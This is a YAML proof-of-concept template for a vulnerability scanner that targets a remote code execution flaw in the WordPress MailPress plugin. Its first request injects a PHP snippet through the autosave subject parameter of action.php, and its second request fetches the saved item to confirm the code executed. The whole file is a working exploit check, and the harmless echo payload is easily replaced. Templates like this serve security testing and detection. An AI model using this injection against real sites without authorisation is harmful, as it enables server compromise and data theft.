id: poc-yaml-wordpress-ext-mailpress-rce
info:
  name: Wordpress Ext Mailpress 远程代码执行漏洞
  severity: high
  tags:
  - rce
  finger: WordPress
  reference: []
  description: null
variables:
  r: random_int(10000, 21000)
  r1: random_int(10000, 21000)
transport: http
requests:
- method: POST
  path: /wp-content/plugins/mailpress/mp-includes/action.php
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: action=autosave&id=0&revision=-1&toemail=&toname=&fromemail=&fromname=&to_list=1&Theme=&subject=<?php
    echo {{.r}}%2b{{.r1}};?>&html=&plaintext=&mail_format=standard&autosave=1
  redirect: false
  raw: null
  timeout: null
  expression: contains(body, "<autosave id=")
  output:
  - regex_match(body,"<autosave id='(?P<id>.+?)'")
- method: GET
  path: /wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id={{.id}}
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(body, r + r1)
  output: []
